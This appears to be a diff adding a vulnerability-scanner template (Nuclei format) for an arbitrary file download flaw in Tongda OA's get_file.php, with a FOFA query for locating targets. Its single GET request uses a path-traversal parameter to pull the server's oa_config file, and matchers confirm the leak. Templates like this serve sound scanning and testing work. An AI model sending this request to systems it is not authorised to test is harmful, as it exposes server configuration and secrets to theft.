@@ -1,0 +1,29 @@
+id: tongda-oa-get_file-filedownload
+
+info:
+  name: 通达 OA get_file.php - filedownload
+  author: leadlife
+  severity: high
+  description: 通达 OA 的 get_file.php 文件存在任意文件下载漏洞，攻击者可以通过该漏洞读取服务器上的敏感文件。
+  metadata:
+    verified: true
+    fofa-query: app="通达 OA"
+  tags: tongda,filedownload,oa
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        part: body
+        words:
+          - "$ROOT_PATH"
+          - "<?"
+        condition: and
